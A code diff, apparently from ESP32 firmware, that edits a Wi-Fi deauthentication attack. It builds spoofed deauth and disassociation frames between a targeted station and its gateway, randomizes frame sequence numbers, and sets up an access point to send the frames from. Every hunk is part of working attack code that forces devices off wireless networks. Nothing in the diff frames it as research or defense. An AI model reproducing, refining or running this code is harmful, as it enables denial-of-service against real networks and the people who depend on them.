@@ -39,7 +39,6 @@ void getGatewayMAC(uint8_t gatewayMAC[6]) {
     }
 }
 
-// Helper functions added for fix
 bool isMACZero(const uint8_t* mac) {
     for (int i = 0; i < 6; i++) {
         if (mac[i] != 0x00) return false;
@@ -54,10 +53,14 @@ bool macCompare(const uint8_t* mac1, const uint8_t* mac2) {
     return true;
 }
 
-// Function to get correct AP channel
+// Need to declare these extern since they're in another file
+extern int scannedAPs;
+extern wifi_ap_record_t* APs;
+
 int getAPChannel(const uint8_t* target_bssid) {
     int found_channel = 0;
     
+    // Search through scanned APs to find the target
     for (int i = 0; i < scannedAPs; i++) {
         if (macCompare(APs[i].bssid, target_bssid)) {
             found_channel = APs[i].channel;
@@ -72,10 +75,6 @@ int getAPChannel(const uint8_t* target_bssid) {
     
     return found_channel;
 }
-
-// ============================================
-// SIMPLE MONITOR MODE SETUP (OPTIONAL)
-// ============================================
 
 bool tryMonitorMode(uint8_t channel) {
     Serial.printf("[DEAUTH] Trying monitor mode on CH%d\n", channel);
@@ -121,21 +120,17 @@ bool tryMonitorMode(uint8_t channel) {
     return true;
 }
 
-// ============================================
-// OPTIMIZED FRAME BUILDING (FIXED VERSION)
-// ============================================
-
 void buildOptimizedDeauthFrame(uint8_t* frame, 
                               const uint8_t* dest,
                               const uint8_t* src,
                               const uint8_t* bssid,
                               uint8_t reason = 0x07,
                               bool is_disassoc = false) {
-    // Frame control - fixed type values
+    // Frame control
     frame[0] = is_disassoc ? 0xA0 : 0xC0;
     frame[1] = 0x00;
 
-    // Duration - corrected to standard 311 microseconds
+    // Duration
     frame[2] = 0x3A;
     frame[3] = 0x01;
 
@@ -144,20 +139,16 @@ void buildOptimizedDeauthFrame(uint8_t* frame,
     memcpy(&frame[10], src, 6);
     memcpy(&frame[16], bssid, 6);
 
-    // Sequence control - proper incrementing
+    // Sequence control (randomized)
     static uint16_t seq = 0;
-    seq = (seq + 1) & 0xFFF;
+    seq = random(0, 4096);
     frame[22] = (seq >> 4) & 0xFF;
-    frame[23] = ((seq & 0x0F) << 4) | 0x00;
+    frame[23] = ((seq & 0x0F) << 4);
 
     // Reason code
     frame[24] = reason;
     frame[25] = 0x00;
 }
-
-// ============================================
-// ENHANCED STATION DEAUTH (MAIN FUNCTION - FIXED)
-// ============================================
 
 void stationDeauth(Host host) {
     uint8_t targetMAC[6];
@@ -168,7 +159,10 @@ void stationDeauth(Host host) {
     for (int i = 0; i < 4; i++) victimIP[i] = host.ip[i];
 
     // Convert target MAC
-    if (!stringToMAC(host.mac.c_str(), targetMAC)) {
+    stringToMAC(host.mac.c_str(), targetMAC);
+    
+    // Check if MAC conversion failed (all zeros)
+    if (isMACZero(targetMAC)) {
         displayError("Invalid MAC address", true);
         return;
     }
@@ -194,7 +188,13 @@ void stationDeauth(Host host) {
         delay(10);
         WiFi.mode(WIFI_AP);
 
-        if (!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
+        // Get current SSID or use a default
+        String currentSsid = WiFi.SSID();
+        if (currentSsid.length() == 0) {
+            currentSsid = "DEAUTH_" + String(random(1000, 9999));
+        }
+        
+        if (!WiFi.softAP(currentSsid.c_str(), emptyString, channel, 1, 4, false)) {
             Serial.println("Fail Starting AP Mode");
             displayError("Fail starting Deauth", true);
             return;
@@ -207,11 +207,9 @@ void stationDeauth(Host host) {
     uint8_t deauth_sta_to_ap[26];      // Station -> AP deauth (spoofed)
     uint8_t disassoc_sta_to_ap[26];    // Station -> AP disassociate (spoofed)
 
-    // Build frames with corrected addressing:
-    // AP -> Station frames
+    // Build frames once
     buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, gatewayMAC, gatewayMAC, 0x07, false);
     buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, gatewayMAC, gatewayMAC, 0x07, true);
-    // Station -> AP frames
     buildOptimizedDeauthFrame(deauth_sta_to_ap, gatewayMAC, targetMAC, gatewayMAC, 0x07, false);
     buildOptimizedDeauthFrame(disassoc_sta_to_ap, gatewayMAC, targetMAC, gatewayMAC, 0x07, true);
 
